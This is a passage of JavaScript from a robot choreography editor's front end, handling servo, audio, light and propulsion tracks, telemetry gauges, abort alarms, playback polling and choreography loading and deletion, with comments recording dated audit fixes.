            ❌ <b>Arm ${item.arm}</b> is not configured — only ${count} arm(s) in Settings.<br>
            Change arm slot below and save to fix.
          </div>`;
        }
        const armOpts = Object.fromEntries(
          Array.from({length: Math.max(count, item.arm || 1)}, (_, i) => {
            const sid = armsConfig._servos[i];
            const lbl = (sid && _servoSettings[sid]?.label) || `Arm ${i + 1}`;
            return [i + 1, i + 1 <= count ? lbl : `${lbl} ⚠️ not configured`];
          })
        );
        html += selectRow('ARM SLOT', 'arm', armOpts);
        html += selectRow('ACTION', 'action', { open:'OPEN', close:'CLOSE' });
        html += numRow('PANEL DURATION (s)', 'panel_duration', { min: 0.1, step: 0.1 });
        html += numRow('DELAY (s)',          'delay',          { min: 0.0, step: 0.1 });
        html += numRow('ARM DURATION (s)',   'arm_duration',   { min: 0.1, step: 0.1 });
      } else {
        // Legacy format — servo ID stored directly
        html += `<div style="${_BNR_WARN}">
          ⚠️ Legacy event — uses servo ID directly (<b>${escapeHtml(item.servo_label || item.servo || '?')}</b>).<br>
          Select an arm slot below and save to migrate to the new format.
        </div>`;
        const armOpts = count > 0
          ? Object.fromEntries(Array.from({length: count}, (_, i) => {
              const sid = armsConfig._servos[i];
              const lbl = (sid && _servoSettings[sid]?.label) || `Arm ${i + 1}`;
              return [i + 1, lbl];
            }))
          : { 1: 'Arm 1' };
        html += selectRow('ARM SLOT', 'arm', armOpts);
        html += selectRow('ACTION', 'action', { open:'OPEN', close:'CLOSE' });
        html += numRow('PANEL DURATION (s)', 'panel_duration', { min: 0.1, step: 0.1 });
        html += numRow('DELAY (s)',          'delay',          { min: 0.0, step: 0.1 });
        html += numRow('ARM DURATION (s)',   'arm_duration',   { min: 0.1, step: 0.1 });
      }

    } else if (track === 'dome_servos' || track === 'body_servos') {
      const prefix = track === 'dome_servos' ? 'Servo_M' : 'Servo_S';
      let filtered = _servoList.filter(s => s.startsWith(prefix));
      if (track === 'body_servos' && armsConfig._count > 0) {
        const armServos = armsConfig._servos.slice(0, armsConfig._count).filter(s => s);
        const armPanels = armsConfig._panels.slice(0, armsConfig._count).filter(s => s);
        const armSet = new Set([...armServos, ...armPanels]);
        if (armSet.size > 0) filtered = filtered.filter(s => !armSet.has(s));
      }
      const pool = filtered.length ? filtered : _servoList;
      const servoOpts = Object.fromEntries(pool.map(s => [s, _servoSettings[s]?.label || s]));

      const sid = item.servo || '';
      const isSpecial = _SERVO_SPECIAL.has(sid);
      if (isSpecial) {
        html += `<div style="${_BNR_INFO}">
          ℹ️ Group command — controls <b>${sid === 'all' ? 'all servos' : sid === 'all_dome' ? 'all dome servos' : 'all body servos'}</b> at once.
        </div>`;
      } else {
        const configLabel = _servoSettings[sid]?.label;
        const storedLabel = item.servo_label;
        const isUnknown   = sid && !configLabel;
        const isMismatch  = configLabel && storedLabel && configLabel !== storedLabel;
        if (isUnknown) {
          html += `<div style="${_BNR_ERR}">
            ❌ <b>${escapeHtml(storedLabel || sid)}</b> — servo ID not found in config.<br>
            Select the correct servo below and save.
          </div>`;
        } else if (isMismatch) {
          html += `<div style="${_BNR_WARN}">
            ⚠️ Stored as <b>${escapeHtml(storedLabel)}</b><br>
            Current config: <b>${escapeHtml(configLabel)}</b><br>
            Select the correct servo below and save to confirm.
          </div>`;
        }
      }

      const specialOpts = track === 'dome_servos' ? { all_dome: 'ALL DOME' } : { all_body: 'ALL BODY' };
      const allServoOpts = { ...specialOpts, ...servoOpts };

      if (item.duration !== undefined) html += numRow('DURATION', 'duration', { min: 0.1, step: 0.1 });
      html += selectRow('SERVO', 'servo', allServoOpts);
      html += selectRow('ACTION', 'action', { open:'OPEN', close:'CLOSE', degree:'DEGREE' });
      if (item.action === 'degree') {
        html += numRow('TARGET°', 'target', { min: 10, max: 170, step: 1 });
        html += selectRow('EASING', 'easing', { 'linear':'LINEAR', 'ease-in':'EASE IN', 'ease-out':'EASE OUT', 'ease-in-out':'IN-OUT' });
      }

    } else if (track === 'propulsion') {
      if (item.duration !== undefined) html += numRow('DURATION', 'duration', { min: 0.1, step: 0.5 });
      html += numRow('LEFT', 'left',   { min: -1, max: 1, step: 0.05 });
      html += numRow('RIGHT', 'right', { min: -1, max: 1, step: 0.05 });
    }

    panel.innerHTML = html;

    // Easing preview — only for dome, integrated in fields above; hide old wrap
    const wrap = document.getElementById('chor-easing-wrap');
    if (wrap) wrap.style.display = 'none';
  }

  // Called after a select changes — handles side-effects (audio duration)
  function _onFieldChange(track, idx, field, value) {
    if (track === 'audio') _validateAudioOverflow();
    // Re-validate servo issues when servo assignment changes in inspector
    if (track === 'arm_servos' && field === 'arm') {
      // Migrate legacy event to new arm-slot format when user picks a slot
      const item = (_chor.tracks[track] || [])[idx];
      if (item) {
        item.arm = parseInt(value) || 1;
        delete item.servo;
        delete item.servo_label;
      }
      _renderTrack('arm_servos');
    }
    if ((track === 'dome_servos' || track === 'body_servos') && field === 'servo') {
      // Auto-refresh servo_label from current config when user picks a new servo
      const settings = _servoSettings[value];
      if (settings?.label) {
        const item = (_chor.tracks[track] || [])[idx];
        if (item) item.servo_label = settings.label;
      }
      _validateServoRefs(); _validateAudioRefs();
      _renderTrack('dome_servos');
      _renderTrack('body_servos');
    }
    if (track !== 'audio' || field !== 'file' || !value) return;
    // Audit finding Perf H-2 2026-05-15: previously created a fresh
    // `new Audio(...)` per filename change → 40+ orphan elements per
    // typical "scrub through sounds" workflow, each holding the full
    // MP3 in memory until GC. Per CLAUDE.md B-12 the audio board
    // already uses a single reused instance — apply the same pattern
    // here. Token guards against late `loadedmetadata` events from a
    // previous probe (operator clicks fast).
    if (!_probeAudio) {
      _probeAudio = new Audio();
      _probeAudio.preload = 'metadata';
      _probeAudio.addEventListener('loadedmetadata', () => {
        if (_probeAudio._token !== _probeToken) return;   // stale callback
        if (_probeAudio.duration && isFinite(_probeAudio.duration)) {
          const dur = Math.ceil(_probeAudio.duration * 10) / 10;
          const ctx = _probeAudio._ctx || {};
          choreoEditor._setProp(ctx.track, ctx.idx, 'duration', dur);
          _renderTrack(ctx.track);
          _refreshLayout();
          if (_selected && _selected.track === ctx.track && _selected.idx === ctx.idx)
            _updatePropsPanel(ctx.track, ctx.idx);
        }
      });
    }
    _probeToken = (_probeToken + 1) | 0;
    _probeAudio._token = _probeToken;
    _probeAudio._ctx = { track, idx };
    _probeAudio.src = `/audio/file/${encodeURIComponent(value)}`;
    _probeAudio.load();
  }

  function _validateAudioOverflow() {
    if (!_chor) return;
    const allAudio = _chor.tracks.audio || [];
    // Keep the original index so we can map back into `_audioOverflowIdxs`.
    const events = [];
    allAudio.forEach((e, i) => {
      if (e.action === 'play' && e.duration > 0)
        events.push({ start: e.t, end: e.t + (e.duration || 0), idx: i });
    });

    // Audit finding Perf H-1 2026-05-15: previously O(N²·T) — for each
    // of the 2N timepoints we ran events.filter(...) twice. A 1000-
    // event chor meant ~6M comparisons per keystroke in the inspector
    // (the function runs after every drop, drag, prop edit, load, save).
    // Sweep-line algorithm: O(N log N).
    //   - Build a boundary list of {t, delta:+1|-1, idx}
    //   - Sort by t (ends BEFORE starts at equal t — no double-count
    //     for back-to-back events)
    //   - Walk left-to-right; `active` is the running count, `live`
    //     tracks indices currently overlapping. peak = max(active).
    //   - On a start event, if active > N channels, the just-arrived
    //     event is the one that overflows.
    const bounds = [];
    events.forEach(e => {
      bounds.push({ t: e.start, delta: +1, idx: e.idx });
      bounds.push({ t: e.end,   delta: -1, idx: e.idx });
    });
    bounds.sort((a, b) => a.t - b.t || a.delta - b.delta);   // ends (-1) before starts (+1)

    let peak = 0;
    let active = 0;
    const live = new Set();
    const overflow = new Set();
    for (const b of bounds) {
      if (b.delta > 0) {
        active += 1;
        live.add(b.idx);
        if (active > peak) peak = active;
        if (active > _audioChannelsConfig) {
          // The just-arrived event is the overflowing one.
          overflow.add(b.idx);
        }
      } else {
        active -= 1;
        live.delete(b.idx);
      }
    }
    if (_chor.meta) _chor.meta.audio_channels_required = peak || 0;

    // Skip the redraw if the overflow set hasn't changed since the last
    // call. Most edits don't shift events into/out of overflow — the old
    // code unconditionally re-rendered the entire audio track + re-fitted
    // the layout, so a single arrow-key nudge on a `t` field triggered 3-4
    // full audio-track DOM rebuilds (caller render + validate render +
    // setProp render for derivative fields). For a sequence with 50 audio
    // events this was noticeable UI jank.
    const oldOverflow = _audioOverflowIdxs;
    const sameOverflow = oldOverflow && oldOverflow.size === overflow.size &&
      [...overflow].every(i => oldOverflow.has(i));
    _audioOverflowIdxs = overflow;

    // Update banner (cheap, always run — the text reflects `peak`)
    const banner = document.getElementById('chor-audio-banner');
    if (banner) {
      if (peak > _audioChannelsConfig) {
        banner.textContent =
          `⚠  This choreo uses up to ${peak} simultaneous audio tracks — your system is configured for ${_audioChannelsConfig}. Some sounds may be dropped.`;
        banner.style.display = 'block';
      } else {
        banner.style.display = 'none';
      }
    }

    // Trigger redraw so overflow badges appear on blocks — but only if the
    // overflow set actually changed.
    if (!sameOverflow) {
      _renderTrack('audio');
      _refreshLayout();
    }
  }

  function _drawEasingPreview(name) {
    const canvas = document.getElementById('chor-easing-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    const W = canvas.width, H = canvas.height;
    ctx.clearRect(0, 0, W, H);
    function ease(t) {
      if (name === 'ease-in')     return t * t;
      if (name === 'ease-out')    return 1 - (1 - t) * (1 - t);
      if (name === 'ease-in-out') return t < 0.5 ? 2*t*t : 1 - 2*(1-t)*(1-t);
      return t;
    }
    ctx.strokeStyle = 'rgba(0,170,255,0.08)'; ctx.lineWidth = 1;
    for (let i = 0; i <= 4; i++) {
      ctx.beginPath(); ctx.moveTo(W*i/4, 0); ctx.lineTo(W*i/4, H); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(0, H*i/4); ctx.lineTo(W, H*i/4); ctx.stroke();
    }
    ctx.beginPath();
    for (let x = 0; x <= W; x++) { const y = H - ease(x/W)*H; x === 0 ? ctx.moveTo(x,y) : ctx.lineTo(x,y); }
    ctx.strokeStyle = '#00eeff'; ctx.lineWidth = 2; ctx.shadowBlur = 6; ctx.shadowColor = '#00eeff';
    ctx.stroke(); ctx.shadowBlur = 0;
    document.querySelectorAll('.chor-ease-btn').forEach(btn => {
      const map = { 'LINEAR':'linear', 'EASE IN':'ease-in', 'EASE OUT':'ease-out', 'IN-OUT':'ease-in-out' };
      btn.classList.toggle('active', map[btn.textContent] === name);
    });
  }

  // ── Telemetry + alarms ────────────────────────────────────────────
  function _updateTelem(telem) {
    _lastTelem = telem;
    const section = document.getElementById('chor-telem-section');
    if (!section) return;
    // Telemetry section is always visible — show dashes when no data
    if (!telem || (!telem.L && !telem.R)) {
      ['chor-telem-v','chor-telem-t','chor-telem-c'].forEach(id => {
        const el = document.getElementById(id); if (el) el.textContent = '—';
      });
      ['chor-telem-v-bar','chor-telem-t-bar','chor-telem-c-bar'].forEach(id => {
        const el = document.getElementById(id); if (el) el.style.width = '0%';
      });
      return;
    }

    const vVals = [telem.L && telem.L.v_in, telem.R && telem.R.v_in].filter(Boolean);
    const tVals = [telem.L && telem.L.temp, telem.R && telem.R.temp].filter(Boolean);
    const cVals = [telem.L && Math.abs(telem.L.current), telem.R && Math.abs(telem.R.current)].filter(Boolean);

    if (vVals.length) {
      const vMin = Math.min(...vVals);
      const vPct = batteryGauge.voltToPct(vMin);
      const vCol = batteryGauge.voltToColor(vMin) === '#ff2244' ? 'var(--red)'
                 : batteryGauge.voltToColor(vMin) === '#ff8800' ? 'var(--amber)' : 'var(--green)';
      _setBar('chor-telem-v-bar', 'chor-telem-v', vPct, vMin.toFixed(1)+'V', vCol);
    }
    if (tVals.length) {
      const tMax = Math.max(...tVals);
      const tPct = Math.max(0, Math.min(100, (tMax / 80) * 100));
      const tCol = tPct > 87 ? 'var(--red)' : tPct > 62 ? 'var(--amber)' : 'var(--green)';
      _setBar('chor-telem-t-bar', 'chor-telem-t', tPct, tVals.map(v=>v.toFixed(0)+'°').join('/'), tCol);
    }
    if (cVals.length) {
      const cMax = Math.max(...cVals);
      const cPct = Math.max(0, Math.min(100, (cMax / 30) * 100));
      const cCol = cPct > 87 ? 'var(--red)' : cPct > 62 ? 'var(--amber)' : 'var(--green)';
      _setBar('chor-telem-c-bar', 'chor-telem-c', cPct, cVals.map(v=>v.toFixed(1)+'A').join('/'), cCol);
    }

    // Update command bar gauges
    const battEl = document.getElementById('chor-stat-battery');
    const tempEl = document.getElementById('chor-stat-temp');
    const currEl = document.getElementById('chor-stat-current');

    if (battEl && vVals && vVals.length) {
      const vMin = Math.min(...vVals);
      const col  = batteryGauge.voltToColor(vMin);
      battEl.textContent = vMin.toFixed(1) + 'V';
      battEl.className = 'chor-cmd-gauge' + (col === '#ff2244' ? ' crit' : col === '#ff8800' ? ' warn' : '');
    }
    if (tempEl && tVals && tVals.length) {
      const tMax = Math.max(...tVals);
      const tPctLocal = Math.max(0, Math.min(100, (tMax / 80) * 100));
      tempEl.textContent = tMax.toFixed(0) + '°C';
      tempEl.className = 'chor-cmd-gauge' + (tPctLocal > 87 ? ' crit' : tPctLocal > 62 ? ' warn' : '');
    }
    if (currEl && cVals && cVals.length) {
      const cMax = Math.max(...cVals);
      const cPctLocal = Math.max(0, Math.min(100, (cMax / 30) * 100));
      currEl.textContent = cMax.toFixed(1) + 'A';
      currEl.className = 'chor-cmd-gauge' + (cPctLocal > 87 ? ' crit' : cPctLocal > 62 ? ' warn' : '');
    }
  }

  function _setBar(barId, valId, pct, label, color) {
    const bar = document.getElementById(barId);
    const lbl = document.getElementById(valId);
    if (bar) { bar.style.width = pct + '%'; bar.style.background = color; }
    if (lbl) lbl.textContent = label;
  }

  function _updateAlarms(reason) {
    const dot  = document.getElementById('chor-alarms-dot');
    const text = document.getElementById('chor-alarms-text');
    if (!dot || !text) return;
    if (!reason) { dot.className = 'chor-alarms-dot ok'; text.textContent = 'NO ALARMS'; return; }
    const msgs = { uart_loss:'UART LOSS', undervoltage:'UNDERVOLTAGE', overheat:'OVERHEAT', overcurrent:'OVERCURRENT' };
    dot.className = 'chor-alarms-dot crit';
    text.textContent = msgs[reason] || reason.toUpperCase();
  }

  // ── Playhead polling ─────────────────────────────────────────────
  // Sync the live monitor to the active lights block at t_now
  function _syncChorMonitor(t_now) {
    if (!_chor) { _chorMon.setMode('random'); return; }
    const lights = _chor.tracks.lights || [];
    let activeEv = null;
    for (const ev of lights) {
      const s = ev.t || 0;
      if (t_now >= s && t_now < s + (ev.duration || 0)) { activeEv = ev; break; }
    }
    if (!activeEv) { _chorMon.setMode('off'); _lastLightsEvT = -1; return; }
    const mode = activeEv.mode || 'random';
    const evStart = activeEv.t || 0;
    const evChanged = evStart !== _lastLightsEvT;
    if (evChanged) _lastLightsEvT = evStart;

    if (mode === 'text') {
      _chorMon.setMode('text');
      if (evChanged) _chorMon.setText(activeEv.display || 'fld_top', activeEv.text || '', activeEv.color);
    } else if (mode === 'psi') {
      _chorMon.setMode('psi');
      if (evChanged) {
        const seq = activeEv.sequence || 'normal';
        _chorMon.updatePSI(_PSI_SEQ_COLORS[seq] || '#00ffea', seq);
      }
    } else if (mode === 'holo') {
      // holo projectors don't affect FLD/RLD/PSI monitor — no visual change
    } else if (mode.startsWith('t') && /^\d+$/.test(mode.slice(1))) {
      _chorMon.setModeNum(parseInt(mode.slice(1), 10));
    } else {
      _chorMon.setMode(mode);
    }
  }

  let _connLostFails = 0;
  function _startPolling() {
    _stopPolling();
    _connLostFails = 0;
    _pollTimer = setInterval(async () => {
      const status = await api('/choreo/status');
      // Audit finding Perf M-6 2026-05-15: connection lost mid-
      // playback used to leave the poll loop spinning at 200ms
      // hammering the Master with failed requests and giving the
      // operator no indication that anything was wrong. Now we
      // track consecutive failures; after 5 (≈1s) we show a
      // banner. The poll keeps running so we can recover.
      if (status === null) {
        _connLostFails += 1;
        if (_connLostFails === 5) {
          const banner = document.getElementById('chor-conn-banner');
          if (banner) banner.style.display = 'block';
          else toast('Connection lost — playback continues on robot', 'warn');
        }
        return;
      }
      if (_connLostFails > 0) {
        _connLostFails = 0;
        const banner = document.getElementById('chor-conn-banner');
        if (banner) banner.style.display = 'none';
      }
      // Bug B4 fix 2026-05-15: if the playing choreo on the server
      // is NOT the one the operator currently has loaded in the
      // editor, the playhead would sweep across the WRONG timeline
      // and _syncChorMonitor would read events from the LOADED chor
      // (not the playing one) → garbage visuals.
      //
      // 2026-05-15 (user-reported bug): also freeze when NOTHING is
      // loaded — previous logic let !loadedName fall through to
      // sameChoreo=true so a startup-triggered choreo would advance
      // an empty editor's playhead. The playhead only makes sense
      // when it reflects the LOADED chor's progress.
      const loadedName = (_chor && _chor.meta && _chor.meta.name) || '';
      const ph = document.getElementById('chor-playhead');
      const tc = document.getElementById('chor-timecode');
      const sameChoreo = loadedName && status.name && status.name === loadedName;
      if (sameChoreo) {
        if (ph) ph.style.left = _px(status.t_now || 0) + 'px';
        if (tc) tc.textContent = _fmtTime(status.t_now || 0);
        _syncChorMonitor(status.t_now || 0);
      } else {
        if (ph) ph.style.left = '0px';
        if (tc) tc.textContent = status.name ? `▶ ${status.name}` : '0:00';
      }
      _updateTelem(status.telem || null);
      _updateAlarms(status.abort_reason || null);
      if (status.abort_reason) { _stopPolling(); _showAbortModal(status.abort_reason); return; }
      if (!status.playing) _stopPolling();
    }, 200);
  }
  function _stopPolling() {
    if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
    // WOW polish L3: clear the PLAY button playing-state on stop/end/abort.
    const pb = document.getElementById('chor-btn-play');
    if (pb) { pb.classList.remove('chor-playing'); pb.textContent = '▶ PLAY'; }
  }

  function _showAbortModal(reason) {
    const modal = document.getElementById('modal-chor-abort');
    const label = document.getElementById('chor-abort-reason');
    if (!modal) return;
    // Audit finding Perf M-4 2026-05-15: the player can set
    // abort_reason to anything _vesc_block_reason() returns
    // (vesc_unsafe, drive_unsafe, L_stale, R_fault=99, estop_active,
    // stow_in_progress, …) plus the four hand-mapped reasons here.
    // Extend the label dict so the common cases get human-readable
    // text instead of falling back to UPPERCASE-WITH-SPACES.
    const msgs = {
      uart_loss:        'UART LOSS — Slave unreachable',
      undervoltage:     'UNDERVOLTAGE — battery low',
      overheat:         'OVERHEAT — VESC too hot',
      overcurrent:      'OVERCURRENT — drive load too high',
      vesc_unsafe:      'VESC UNSAFE — check VESC config / connection',
      drive_unsafe:     'DRIVE UNSAFE — VESC fault',
      estop_active:     'E-STOP ACTIVE — reset to resume',
      stow_in_progress: 'STOW IN PROGRESS — wait for servos to settle',
    };
    if (label) {
      label.textContent = msgs[reason]
        || (typeof reason === 'string' ? reason.toUpperCase().replace(/_/g,' ') : 'ABORTED');
    }
    modal.style.display = 'flex';
  }

  // ── Snap UI sync ──────────────────────────────────────────────────
  function _syncSnapUI() {
    document.getElementById('chor-snap-01')?.classList.toggle('active', _snapVal === 0.1);
    document.getElementById('chor-snap-05')?.classList.toggle('active', _snapVal === 0.5);
    document.getElementById('chor-snap-off')?.classList.toggle('active', _snapVal === 0);
  }

  // ── Public API ────────────────────────────────────────────────────
  return {

    async init() {
      _startMonitor();
      _syncSnapUI();
      _initPalette();          // guarded internally by _paletteWired below
      _addDropToLanes();       // already guarded by _lanesWired

      // Re-render on container resize so liquid fill stays accurate.
      // ResizeObserver was previously re-created on every tab switch (one
      // observer per init() call) → 10 switches = 10 observers all firing
      // _refreshLayout for every resize. The guard makes it run once for
      // the lifetime of the page.
      if (!_globalsWired) {
        const scrollWrap = document.getElementById('chor-scroll');
        if (scrollWrap && window.ResizeObserver) {
          new ResizeObserver(() => { if (_chor) _refreshLayout(); }).observe(scrollWrap);
        }

        // Delete/Backspace removes the selected block (skip when typing in an input).
        // Same leak as the ResizeObserver before the guard — N tab switches
        // produced N keydown handlers, so a single Delete press deleted N
        // blocks in succession.
        document.addEventListener('keydown', e => {
          // Skip keys when typing in form fields — operator might be
          // editing a label, choreo name, etc.
          if (['INPUT', 'SELECT', 'TEXTAREA'].includes(e.target.tagName)) return;
          // Only fire while the Choreo tab is the active outer tab.
          if (document.querySelector('.tab.active')?.dataset.tab !== 'choreo') return;

          // Space → play / stop the current choreo (DAW convention).
          // Audit finding Perf M-2 + WOW feature 2026-05-15.
          if (e.key === ' ' || e.code === 'Space') {
            e.preventDefault();
            if (_chor && _chor.meta && _chor.meta.name) {
              // If a choreo is currently playing the player, stop it;
              // otherwise start the one loaded in the editor.
              api('/choreo/status').then(s => {
                if (s && s.playing) {
                  api('/choreo/stop', 'POST');
                } else {
                  choreoEditor.play();
                }
              });
            }
            return;
          }

          if (!_selected) return;

          // Delete / Backspace removes the selected block.
          if (e.key === 'Delete' || e.key === 'Backspace') {
            e.preventDefault();
            _deleteBlock(_selected.track, _selected.idx);
            return;
          }

          // Arrow Left / Right nudge the selected event's t by the
          // current snap value. Shift-arrow = 10× nudge for coarse
          // moves. Audit finding Perf M-2 + WOW feature.
          if (e.key === 'ArrowLeft' || e.key === 'ArrowRight') {
            e.preventDefault();
            const dir = e.key === 'ArrowRight' ? 1 : -1;
            const step = (_snapVal || 0.1) * (e.shiftKey ? 10 : 1);
            const item = _chor && _chor.tracks[_selected.track]?.[_selected.idx];
            if (item) {
              const newT = Math.max(0, _snap((item.t || 0) + dir * step));
              item.t = newT;
              _setDirty(true);
              _renderTrack(_selected.track);
              _refreshLayout();
              _selectBlock(_selected.track, _selected.idx);
            }
            return;
          }

          // Arrow Up / Down cycle through events in the current
          // track (selected ± 1).
          if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
            e.preventDefault();
            const dir = e.key === 'ArrowDown' ? 1 : -1;
            const evs = _chor && _chor.tracks[_selected.track];
            if (Array.isArray(evs) && evs.length > 0) {
              const next = Math.max(0, Math.min(evs.length - 1, _selected.idx + dir));
              _selectBlock(_selected.track, next);
            }
            return;
          }
        });

        // Easing preset buttons — wired via data-easing attribute instead
        // of inline onclick handlers in the template (CSP-friendly).
        document.querySelectorAll('.chor-ease-btn[data-easing]').forEach(btn => {
          btn.addEventListener('click', () => choreoEditor.setEasing(btn.dataset.easing));
        });

        _globalsWired = true;
      }

      // Pre-fetch dropdown data — wait for ALL before re-rendering so arm labels are fresh
      Promise.all([
        // Audio: disk scan is authoritative; fall back to index for grouped display
        api('/audio/scan').then(r => {
          if (r && r.sounds) _audioScanned = r.sounds;
        }).catch(() => {}),
        api('/audio/index').then(r => { if (r && r.categories) _audioIndex = r.categories; }),
        // Audio channel count drives _validateAudioOverflow's polyphony cap.
        // Without this, the validator uses the module-default of 6 until the
        // user visits Settings — which means a config of 1, 2, 12 etc. produces
        // wrong overflow warnings (false positives below 6, missed overflows
        // above 6). Fetch once at init so the cap is always correct here.
        api('/settings').then(r => {
          if (r && r.audio && typeof r.audio.channels === 'number') {
            _audioChannelsConfig = r.audio.channels;
          }
        }).catch(() => {}),
        // Reset servo list on each init to avoid accumulation across tab switches
        api('/servo/body/list').then(r => { if (r && r.servos) _servoList = [...new Set([..._servoList, ...r.servos])]; }),
        api('/servo/dome/list').then(r => { if (r && r.servos) _servoList = [...new Set([..._servoList, ...r.servos])]; }),
        api('/servo/settings').then(r => { if (r && r.panels) _servoSettings = r.panels; }),
        // Lights: full T-code list from Animations panel + custom .lseq files
        api('/teeces/animations').then(r => {
          if (r && r.animations) {
            _lightModes = {};
            r.animations.forEach(a => { _lightModes[`t${a.mode}`] = a.name; });
          }
        }).catch(() => {}),
        api('/light/list').then(r => {
          if (r && r.sequences)
            r.sequences.forEach(s => { if (!_lightModes[s]) _lightModes[s] = s; });
        }),
        api('/vesc/config').then(r => { if (r) _vescCfgSnapshot = r; }),
        armsConfig.load(),
      ]).then(() => {
        // Re-render once ALL data (servo settings + arm config) is fresh
        if (_chor) {
          _validateServoRefs(); _validateAudioRefs();
          _renderAllTracks();
        }
      }).catch(() => {});

      const names = await api('/choreo/list');
      const sel   = document.getElementById('chor-select');
      if (sel && names) {
        sel.innerHTML = '<option value="">— select choreography —</option>' +
          _chorSelectOptions(names);
        if (_chor && _chor.meta && _chor.meta.name) sel.value = _chor.meta.name;
        sel.onchange = () => this._switchTo(sel.value);
      }
      // F-10: if a choreo is currently playing on the Pi (tab was opened
      // during playback, OR user switched away then back), resume polling
      // so the playhead/timecode/telem are live again. Previously the tab
      // switch at app.js:872 cleared _pollTimer and init() never restarted
      // it, leaving the UI frozen until the user clicked Play or Stop.
      try {
        const status = await api('/choreo/status');
        if (status && status.playing) {
          _startPolling();
        }
      } catch {}
    },

    // Exposed for switchTab() + beforeunload guards. Returns true if
    // there are unsaved local edits that would be lost on navigation.
    hasUnsavedChanges() {
      return !!(_dirty && _chor && _chor.meta && _chor.meta.name);
    },

    // Live ref to the in-memory chor. Used by Sequences-tab inline
    // rename to keep the editor's cached label in sync (audit L-C).
    _chorRef() { return _chor; },

    // Dirty-flag guard for the chor-select dropdown. Audit finding
    // Frontend H-3 2026-05-15: switching choreos via the dropdown
    // silently discarded unsaved edits. Now confirms before swapping.
    // load() itself doesn't run the check (it's also called from
    // delete/save flows that have their own state-management) — only
    // the dropdown path goes through _switchTo.
    _switchTo(name) {
      if (_dirty && _chor && _chor.meta && _chor.meta.name) {
        if (!confirm(`"${_chor.meta.name}" has unsaved changes. Switch anyway and lose them?`)) {
          // Revert the dropdown selection to the current choreo
          const sel = document.getElementById('chor-select');
          if (sel && _chor.meta.name) sel.value = _chor.meta.name;
          return;
        }
      }
      this.load(name);
    },

    async load(name) {
      if (!name) return;
      const slot = document.getElementById('chor-banner-slot');
      if (slot) slot.innerHTML = '';
      const chor = await api(`/choreo/load?name=${encodeURIComponent(name)}`);
      if (!chor) { toast('Failed to load choreography', 'error'); return; }
      _chor = chor;
      // Migrate legacy audio2 track → unified audio track with ch=1
      if (_chor.tracks.audio2 && _chor.tracks.audio2.length) {
        _chor.tracks.audio2.forEach(ev => _chor.tracks.audio.push({ ...ev, ch: 1 }));
        _chor.tracks.audio.sort((a, b) => (a.t || 0) - (b.t || 0));
      }
      delete _chor.tracks.audio2;
      // Migrate legacy generic "servos" track → body_servos
      if (_chor.tracks.servos && _chor.tracks.servos.length) {
        if (!_chor.tracks.body_servos) _chor.tracks.body_servos = [];
        _chor.tracks.body_servos.push(..._chor.tracks.servos.map(ev => ({ ...ev, group: 'body' })));
        delete _chor.tracks.servos;
      }
      // Ensure all three servo tracks exist
      if (!_chor.tracks.dome_servos) _chor.tracks.dome_servos = [];
      if (!_chor.tracks.body_servos) _chor.tracks.body_servos = [];
      if (!_chor.tracks.arm_servos)  _chor.tracks.arm_servos  = [];
      // Normalize dome KFs — legacy files may be missing accel or duration
      (_chor.tracks.dome || []).forEach(kf => {
        if (kf.accel == null) kf.accel = 1.0;
        if (!kf.duration || kf.duration < 200) kf.duration = 200;
      });
      // Normalize servo KFs — legacy files may be missing duration or easing
      (_chor.tracks.servos || []).forEach(ev => {
        if (!ev.duration || ev.duration <= 0) ev.duration = 1.0;
        if (!ev.easing) ev.easing = 'ease-in-out';
      });
      _setDirty(false); _existsOnDisk = true; _selected = null; _zoomFactor = 1.0; _clearInspectorTitle();
      // Ensure servo settings are loaded before migration/validation (race guard)
      if (Object.keys(_servoSettings).length === 0) {
        const r = await api('/servo/settings');
        if (r && r.panels) _servoSettings = r.panels;
      }
      // Ensure armsConfig is loaded before rendering arm_servos blocks.
      // init()'s Promise.all fires armsConfig.load() concurrently, but if the
      // user clicks a choreography in the dropdown before the Promise.all
      // resolves, arm blocks render with armsConfig._count=0 (showing every
      // arm as "❌ not configured") until the Promise.all completes and
      // triggers a re-render. The flicker confuses users and the intermediate
      // state can briefly mark blocks as legacy.
      await armsConfig.load();
      // Migrate legacy label-based servo refs → hardware IDs
      const _migrateResult = _migrateLegacyServoRefs();
      if (_migrateResult) {
        _setDirty(true);
        if (_migrateResult === 'partial') {
          toast('Some servo refs could not be migrated — check servo config', 'warn');
        } else {
          toast('Servo refs migrated to hardware IDs — save to confirm', 'info');
        }
      }
      // Validate servo refs against current config
      _validateServoRefs(); _validateAudioRefs();
      // Show VESC config mismatch banner if snapshot in file differs from current machine
      _showVescMismatchBanner(_chor.meta?.config_snapshot);
      _renderAllTracks();
      _validateAudioOverflow();
      toast(`Loaded: ${name}`, 'ok');
    },

    async deleteChor() {
      if (!adminGuard.unlocked && !_choreoUnlocked) {
        adminGuard.showModal(null, () => choreoEditor.deleteChor());
        return;
      }
      if (!_chor) { toast('No choreography loaded', 'error'); return; }
      const name = _chor.meta.name;
      if (!confirm(`Are you sure you want to delete "${name}"?`)) return;
      // Audit findings CR-4 + CR-5 2026-05-15: was using raw fetch
      // which bypasses adminGuard's X-Admin-Pw header injection → every
      // delete 401'd silently. Now goes through api() (header attached
      // automatically) AND uses a raw fetch wrapper to surface the
      // server's 409 "currently playing — stop it first" message
      // instead of a generic "Delete failed (409)".
      try {
        const headers = {};
        const tok = (typeof adminGuard !== 'undefined' && adminGuard.getToken && adminGuard.getToken()) || '';
        if (tok) headers['X-Admin-Pw'] = tok;
        const resp = await fetch(`/choreo/${encodeURIComponent(name)}`, { method: 'DELETE', headers });
        if (!resp.ok) {
          let detail = '';
          try { detail = (await resp.json()).error || ''; } catch {}
          toast(`Delete failed: ${detail || resp.status}`, 'error');
          return;
        }
      } catch (e) {
        toast(`Delete failed: ${e.message || e}`, 'error');
        return;
      }
      _chor = null; _setDirty(false); _selected = null; _clearInspectorTitle();
      _renderAllTracks();
      const names = await api('/choreo/list');
      const sel = document.getElementById('chor-select');
      if (sel && names) {
        sel.innerHTML = '<option value="">— select choreography —</option>' +
          _chorSelectOptions(names);
        sel.onchange = () => this._switchTo(sel.value);
        if (names.length > 0) { sel.value = names[0].name || names[0]; await this.load(names[0].name || names[0]); }
      }
      toast(`Deleted: ${name}`, 'ok');
    },

    async renameChor() {
